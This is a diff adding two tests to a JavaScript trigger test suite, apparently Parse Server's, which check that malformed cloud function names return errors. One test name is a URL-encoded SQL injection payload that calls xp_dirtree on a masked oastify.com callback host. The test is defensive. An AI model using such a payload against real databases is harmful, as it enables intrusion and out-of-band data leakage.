@@ -693,4 +693,26 @@ describe('triggers', () => {
     );
     expect(req.context).toBeUndefined();
   });
+
+  it('should return error on invalid function name', async () => {
+    const cloudFunctionName = `test'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cxxxxxxxxxxxxxxx.oasti'%2b'fy.com%5cxus'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20`
+    let error;
+    try {
+      await Parse.Cloud.run(cloudFunctionName);
+    } catch (err) {
+      error = err;
+    }
+    expect(error).toBeDefined();
+  });
+
+  it('should not crash the server and return an error because of function name with dots', async () => {
+    const cloudFunctionName = `test.function.name`
+    let error;
+    try {
+      await Parse.Cloud.run(cloudFunctionName);
+    } catch (err) {
+      error = err;
+    }
+    expect(error).toBeDefined();
+  });
 });
